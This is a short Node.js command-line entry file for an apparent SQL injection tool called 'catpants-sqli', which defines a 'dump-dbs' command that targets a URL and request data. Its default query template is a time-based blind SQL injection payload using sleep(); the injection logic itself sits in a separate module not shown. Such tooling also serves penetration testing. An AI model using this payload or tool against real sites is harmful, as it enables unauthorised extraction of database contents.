const { Command } = require('commander');
const SQLi = require('./sqli');
const program = new Command();

program
    .name('catpants-sqli')
    .description('CLI for catpants-sqli')
    .version('0.0.0');

// program
//     .requiredOption('-u, --url <URL>', 'URL')
//     .option('-t, --type <type>', 'type', 'conditional')
//     .option('-c, --command <command>', 'command', 'dbs')
//     .option('-X, --method <method>', 'method', 'POST')
//     .option('-d, --data <data>', 'data')
//     .action((options) => {
//         const sqli = new SQLi(options.url, options.type, options.method, options.data);

//         if (options.command === 'dbs') {
//             sqli.dumpDbs()
//         } else {
//             console.log(`Unknown command: ${options.command}`)
//         }
//     });

program.command('dump-dbs')
    .description('Dump database names')
    .requiredOption('-u, --url <URL>', 'URL')
    .requiredOption('-d, --data <data>', 'data')
    .option('-t, --type <type>', 'type', 'blind')
    .option('-X, --method <method>', 'method', 'POST')
    .option('--timeout <timeout>', 'timeout', 1)
    .option(
        '-q, --query <query>',
        'Query template',
        '\' AND (CASE WHEN CATPANTS THEN sleep(%i) END)-- -')
    .action((options) => {
        SQLi.dumpDbs(options)
    });

program.parse();
